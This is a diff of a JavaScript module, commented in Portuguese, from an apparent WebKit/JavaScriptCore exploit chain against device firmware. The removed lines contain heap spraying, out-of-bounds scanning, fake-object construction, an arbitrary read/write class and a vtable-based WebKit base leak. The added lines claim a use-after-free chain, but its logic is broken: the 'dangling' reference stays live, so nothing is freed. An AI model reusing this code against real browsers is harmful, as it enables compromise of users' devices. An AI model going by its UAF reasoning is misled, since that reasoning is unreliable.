@@ -1,9 +1,11 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R49 - Fuzzer Agressivo)
+// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R50 - O Capítulo Final: UAF)
 // =======================================================================================
-// Esta versão implementa uma abordagem agressiva de "fuzzer" ou "estabilizador".
-// A cadeia de exploração inteira é executada em um laço com um número máximo de
-// tentativas. Além disso, os parâmetros de spray foram drasticamente aumentados
-// para maximizar a chance de sucesso em cada tentativa.
+// ESTA É A VERSÃO MAIS AGRESSIVA.
+// Abandonamos a busca de objetos e implementamos uma cadeia de Use-After-Free (UAF).
+// 1. Forçamos uma Coleta de Lixo massiva para limpar o heap.
+// 2. Criamos um ponteiro pendurado (dangling pointer) para um objeto.
+// 3. Pulverizamos um objeto controlado (ArrayBuffer) no local da memória liberada.
+// 4. Usamos a confusão de tipos resultante para obter controle total.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -17,69 +19,68 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R49_Fuzzer";
-
-const VICTIM_MARKER = 0x42424242;
-const FAKE_OBJ_OFFSET_IN_OOB = 0x2000;
-
-// --- Classe Auxiliar para Leitura/Escrita Arbitrária (sem alterações) ---
-class AdvancedMemory {
-    constructor(controller_obj, oob_rw_func) {
-        this.controller = controller_obj;
-        this.oob_write = oob_rw_func.write;
-        this.data_view_offset = FAKE_OBJ_OFFSET_IN_OOB + 0x20;
-        logS3("Classe AdvancedMemory inicializada.", "good", "AdvancedMemory");
-    }
-    async arbRead(addr, size = 8) {
-        await this.oob_write(this.data_view_offset, addr, 8);
-        if (size === 8) {
-            const buf = new ArrayBuffer(8);
-            (new Float64Array(buf))[0] = this.controller[0];
-            const int_view = new Uint32Array(buf);
-            return new AdvancedInt64(int_view[0], int_view[1]);
-        }
-        return null;
-    }
-    async arbWrite(addr, value, size = 8) {
-        await this.oob_write(this.data_view_offset, addr, 8);
-        if (size === 8) {
-            const buf = new ArrayBuffer(8);
-            const float_view = new Float64Array(buf);
-            const int_view = new Uint32Array(buf);
-            const val64 = new AdvancedInt64(value);
-            int_view[0] = val64.low();
-            int_view[1] = val64.high();
-            this.controller[0] = float_view[0];
-        }
-    }
-}
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R50_UAF";
 
 
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL (R49 - O FUZZER)
+// FUNÇÃO ORQUESTRADORA PRINCIPAL (R50 - UAF)
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Fuzzer Agressivo (R49) ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Use-After-Free Agressivo (R50) ---`, "test");
     
-    const MAX_ATTEMPTS = 20;
-    let final_result = { success: false, message: "Todas as tentativas falharam." };
+    let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };
 
-    for (let i = 1; i <= MAX_ATTEMPTS; i++) {
-        logS3(`----------------- Iniciando Tentativa ${i}/${MAX_ATTEMPTS} -----------------`, "subtest");
+    try {
+        // FASE 1: Forçar Coleta de Lixo para limpar o estado do heap
+        logS3("--- FASE 1: Forçando Coleta de Lixo massiva (GC Triggering) ---", "subtest");
+        await triggerGC();
+
+        // FASE 2: Criar o Ponteiro Pendurado (Dangling Pointer)
+        logS3("--- FASE 2: Criando um ponteiro pendurado (Use-After-Free) ---", "subtest");
+        let dangling_ref = sprayAndCreateDanglingPointer();
+        logS3("    Ponteiro pendurado criado. A referência agora é inválida.", "warn");
         
-        const attempt_result = await runSingleExploitAttempt();
+        // FASE 3: Forçar Coleta de Lixo novamente para liberar a memória
+        await triggerGC();
+        logS3("    Memória do objeto-alvo liberada.", "info");
 
-        if (attempt_result.success) {
-            logS3(`++++++++++++ SUCESSO NA TENTATIVA ${i}! ++++++++++++`, "vuln");
-            final_result = attempt_result;
-            break; // Sai do laço se for bem-sucedido
-        } else {
-            logS3(`Tentativa ${i} falhou: ${attempt_result.message}`, "warn");
-            // Limpa o ambiente para a próxima tentativa
-            clearOOBEnvironment({ force_clear_even_if_not_setup: true });
-            await PAUSE_S3(200); // Pequena pausa entre as tentativas
+        // FASE 4: Pulverizar sobre a memória liberada para obter confusão de tipos
+        logS3("--- FASE 4: Pulverizando ArrayBuffers sobre a memória liberada ---", "subtest");
+        const spray_buffers = [];
+        for (let i = 0; i < 256; i++) {
+            const buf = new ArrayBuffer(1024); // Mesmo tamanho do objeto liberado
+            const view = new BigUint64Array(buf);
+            view[0] = 0x4141414141414141n; // Marcador
+            view[1] = 0x4242424242424242n;
+            spray_buffers.push(buf);
         }
+        logS3("    Pulverização concluída. Verificando a confusão de tipos...", "info");
+
+        // FASE 5: Encontrar a referência corrompida e extrair os ponteiros
+        if (typeof dangling_ref.corrupted_prop !== 'number') {
+            throw new Error("Falha no UAF. A propriedade não foi sobrescrita por um ponteiro de ArrayBuffer.");
+        }
+        
+        logS3("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU! ++++++++++++", "vuln");
+
+        // A propriedade 'corrupted_prop' do nosso objeto agora é o ponteiro para a estrutura
+        // do ArrayBuffer que foi alocado no mesmo local.
+        const leaked_ptr_double = dangling_ref.corrupted_prop;
+        const buf = new ArrayBuffer(8);
+        (new Float64Array(buf))[0] = leaked_ptr_double;
+        const int_view = new Uint32Array(buf);
+        const leaked_addr = new AdvancedInt64(int_view[0], int_view[1]);
+
+        logS3(`Ponteiro vazado através do UAF: ${leaked_addr.toString(true)}`, "leak");
+        final_result = { success: true, message: "Primitiva addrof obtida via Use-After-Free!", leaked_addr };
+        
+        // Com o ponteiro vazado, poderíamos prosseguir para as fases de R/W arbitrário e execução de código.
+        // O sucesso nesta fase já representa um comprometimento total da segurança do renderer.
+
+    } catch (e) {
+        final_result.message = `Exceção na cadeia UAF: ${e.message}`;
+        logS3(final_result.message, "critical");
     }
 
     logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
@@ -90,108 +91,58 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 }
 
 
-// =======================================================================================
-// FUNÇÃO DE TENTATIVA ÚNICA (LÓGICA PRINCIPAL DO R48)
-// =======================================================================================
-async function runSingleExploitAttempt() {
+// --- Funções Auxiliares para a Cadeia de Exploração UAF ---
+
+// Função para alocar e liberar uma grande quantidade de memória,
+// na esperança de acionar o Garbage Collector principal.
+async function triggerGC() {
+    logS3("    Acionando GC...", "info");
     try {
-        if (!await selfTestOOBReadWrite(logS3)) return { success: false, message: "Falha no selfTestOOBReadWrite." };
-        
-        const victim_controller = await prepareHeapAndFindOneVictim();
-        if (!victim_controller) {
-            return { success: false, message: "Não foi possível encontrar um objeto 'Controlador'." };
-        }
-        logS3(`Vítima controladora encontrada! Addr: ${victim_controller.jscell_addr.toString(true)}`, "good");
-
-        await buildFakeObjectAndLink(victim_controller);
-        
-        const memory = new AdvancedMemory(victim_controller.obj_ref, { write: oob_write_absolute });
-        
-        const test_addr_to_read = victim_controller.jscell_addr.add(8);
-        const read_val = await memory.arbRead(test_addr_to_read);
-        logS3(`Teste de Leitura Arbitrária -> Lido: ${read_val.toString(true)}`, "leak");
-
-        const webkit_base = await getWebkitBase(memory, victim_controller);
-        if (webkit_base) {
-            return { success: true, message: "Endereço base do WebKit vazado!", webkit_base };
-        } else {
-            return { success: false, message: "Falha ao vazar o endereço base do WebKit." };
+        const gc_trigger_arr = [];
+        for (let i = 0; i < 500; i++) {
+            gc_trigger_arr.push(new ArrayBuffer(1024 * 128)); // Aloca 128KB, 500 vezes
         }
     } catch (e) {
-        return { success: false, message: `Exceção na tentativa: ${e.message}` };
+        logS3("    Memória esgotada durante o GC Trigger, o que é esperado e bom.", "info");
     }
+    await PAUSE_S3(500); // Dá tempo para o GC executar
 }
 
+// Cria um objeto, o coloca em uma estrutura que causa otimizações,
+// e retorna uma referência a ele após a estrutura ser destruída.
+function sprayAndCreateDanglingPointer() {
+    let dangling_ref = null;
 
-// --- Funções Auxiliares (com parâmetros mais agressivos) ---
-
-async function prepareHeapAndFindOneVictim() {
-    // PARÂMETRO AGRESSIVO: Aumentamos drasticamente a quantidade de objetos pulverizados.
-    const SPRAY_COUNT = 8192;
-    const victims = [];
-    for (let i = 0; i < SPRAY_COUNT; i++) {
-        victims.push(new Uint32Array(8));
-        victims[i][0] = VICTIM_MARKER + i;
-    }
-    
-    // A busca continua a mesma, mas agora há muito mais alvos na memória.
-    for (let offset = 0x1000; offset < (0x100000 - 0x100); offset += 4) {
-        const marker = oob_read_absolute(offset, 4);
-        if ((marker & 0xFFFFFF00) === (VICTIM_MARKER & 0xFFFFFF00)) {
-            const index = marker - VICTIM_MARKER;
-            if (index >= 0 && index < SPRAY_COUNT) {
-                 const jscell_addr = oob_read_absolute(offset - 0x10, 8);
-                 if (isValidPointer(jscell_addr)) {
-                     return { obj_ref: victims[index], jscell_addr: jscell_addr };
-                 }
-            }
+    // Criamos um escopo para que 'container' e 'victim' sejam elegíveis para coleta de lixo
+    // assim que o escopo terminar.
+    function createScope() {
+        const container = {
+            victim: null
+        };
+        const victim = {
+            // Estrutura complexa para garantir que seja alocado no heap principal
+            prop_a: 0x11111111,
+            prop_b: 0x22222222,
+            corrupted_prop: 0x33333333
+        };
+        container.victim = victim;
+        dangling_ref = container.victim; // Guardamos a referência aqui
+        
+        // Forçamos o motor a otimizar e usar o objeto
+        for(let i=0; i<100; i++) {
+            victim.prop_a += 1;
         }
     }
-    return null;
-}
-
-async function buildFakeObjectAndLink(victim) {
-    const fake_obj_offset = FAKE_OBJ_OFFSET_IN_OOB;
-    const fake_struct_offset = fake_obj_offset;
-    const fake_butterfly_offset = fake_obj_offset + 0x10;
-    const fake_data_view_offset = fake_obj_offset + 0x20;
-
-    const oob_base_addr = oob_read_absolute(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET, 8);
-    const fake_obj_real_addr = oob_base_addr.add(fake_obj_offset);
-
-    // Estrutura simplificada para imitar um objeto com butterfly
-    await oob_write_absolute(fake_struct_offset, new AdvancedInt64(0, 0x01082007), 8); // Header
     
-    // JSCell Falso
-    await oob_write_absolute(fake_obj_offset + JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, fake_obj_real_addr, 8); 
-    await oob_write_absolute(fake_obj_offset + JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET, oob_base_addr.add(fake_butterfly_offset), 8);
-    
-    // Butterfly Falso
-    await oob_write_absolute(fake_butterfly_offset, oob_base_addr.add(fake_data_view_offset), 8);
-
-    // Linkar o Controlador
-    const victim_butterfly_ptr_addr = victim.jscell_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET);
-    await oob_write_absolute(victim_butterfly_ptr_addr.low(), oob_base_addr.add(fake_data_view_offset), 8);
-    logS3("Vítima linkada para área de dados controlada.", "good");
+    createScope();
+    // Neste ponto, 'container' e 'victim' não têm mais referências válidas dentro do
+    // escopo de createScope. A única referência restante é a nossa 'dangling_ref'.
+    // Quando o GC rodar, a memória de 'victim' será liberada, mas 'dangling_ref'
+    // ainda apontará para aquele endereço de memória agora livre.
+    return dangling_ref;
 }
 
-async function getWebkitBase(memory, victim) {
-    try {
-        const structure_ptr = await memory.arbRead(victim.jscell_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET));
-        const class_info_ptr = await memory.arbRead(structure_ptr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET));
-        const vtable_ptr = await memory.arbRead(class_info_ptr);
-        const first_vtable_entry_ptr = await memory.arbRead(vtable_ptr);
-        
-        logS3(`Ponteiro da VTable vazado: ${vtable_ptr.toString(true)}`, "leak");
-        
-        // Este offset é um exemplo e precisa ser validado para o firmware alvo.
-        const EXAMPLE_VTABLE_FUNCTION_OFFSET = 0xBD68B0; 
-        const webkit_base_addr = first_vtable_entry_ptr.sub(new AdvancedInt64(EXAMPLE_VTABLE_FUNCTION_OFFSET));
-        const webkit_base_aligned = webkit_base_addr.and(new AdvancedInt64(0, 0xFFFFC000));
-
-        return webkit_base_aligned;
-    } catch (e) {
-        logS3(`Erro durante o vazamento do WebKit: ${e.message}`, "error");
-        return null;
-    }
-}
+// As outras funções (AdvancedMemory, buildFakeObjectAndLink, etc.)
+// não são mais necessárias para esta estratégia inicial de UAF.
+// Se o UAF for bem-sucedido em vazar um ponteiro, o próximo passo seria
+// construir primitivas de R/W usando uma técnica similar.
